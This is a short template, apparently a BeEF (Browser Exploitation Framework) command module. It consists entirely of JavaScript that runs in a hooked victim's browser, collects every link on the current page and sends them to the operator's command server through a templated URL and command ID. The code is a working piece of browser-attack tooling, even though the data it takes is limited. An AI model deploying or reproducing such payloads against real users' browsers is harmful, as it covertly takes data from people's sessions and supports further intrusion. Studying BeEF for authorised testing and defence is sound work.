beef.execute(function() {

	beef.net.send("<%= @command_url %>", <%= @command_id %>, beef.dom.getLinks());
	
});

